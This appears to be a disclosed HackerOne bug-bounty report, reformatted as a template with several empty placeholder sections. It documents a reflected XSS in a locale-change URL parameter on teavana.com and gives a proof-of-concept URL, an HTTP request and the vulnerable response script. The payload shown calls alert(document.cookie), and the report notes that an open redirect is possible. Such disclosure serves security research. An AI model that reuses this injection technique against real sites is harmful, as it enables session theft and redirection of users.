# Reflected XSS on teavana.com (Locale-Change)

## Metadata
- **Source:** HackerOne
- **Report:** 190798 | https://hackerone.com/reports/190798
- **Submitted:** 2016-12-13
- **Reporter:** inhibitor181
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
SUMMARY
----
Hello, the link at https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=en_CA (was identified by changing languages) is prone to reflected XSS in the "en" zone of the LocaleID parameter. One can inject javascript that will be reflected back to the target while calling the modified link. 

POC
-----
https://www.teavana.com/on/demandware.store/Si

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

SUMMARY
----
Hello, the link at https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=en_CA (was identified by changing languages) is prone to reflected XSS in the "en" zone of the LocaleID parameter. One can inject javascript that will be reflected back to the target while calling the modified link. 

POC
-----
https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(document.cookie);//an_CA

This injection is possible because the contents before the _CA are not validated and it will be injected in the response.

Request :

```
GET /on/demandware.store/Sites-Teavana-Site/default/Locale-Change?LocaleID=eas%27;alert(1);//dasdsan_CA HTTP/1.1
Host: www.teavana.com
```

Response :

```
<script type="text/javascript">
var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';
uri=decodeURIComponent(uri);
if(uri.indexOf("/ca/en") >=0){
  uri=uri.replace("/ca/en","");
}
else if(uri.indexOf("/ca/fr") >=0){
  uri=uri.replace("/ca/fr","");
}
window.location = uri;
</script>
```

Note the : var uri = 'https:///on/demandware.store/Sites-StarbucksCA-Site/eas';alert(1);//dasdsan_CA/Home-Show';

This can also be modified to easily make an open redirect.

Also attached screenshot.

</details>

---
*Analysed by Claude on 2026-05-24*
